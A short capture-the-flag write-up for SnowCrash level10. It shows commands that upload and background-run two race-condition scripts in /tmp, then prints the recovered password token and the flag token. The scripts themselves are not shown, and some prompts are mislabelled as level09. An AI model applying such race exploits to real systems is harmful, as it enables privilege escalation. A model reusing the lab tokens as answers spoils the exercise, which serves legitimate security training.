# Snow-crash - level10
## Find something
```bash
level09@SnowCrash:~$ ls
level09  token
```
* We spamm
```bash
scp -P 4242 level10/Ressources/*.sh level10@192.168.56.101:/tmp/.
chmod 777 /tmp/level10swap.sh
chmod 777 /tmp/level10exec.sh
/tmp/level10swap.sh &
/tmp/level10exec.sh &

```
* At this point we have the token
```bash
woupa2yuojeeaaed06riuj63c
```
* Getflag
```bash
level09@SnowCrash:/tmp$ su flag10
Password: 
Don't forget to launch getflag !
flag09@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```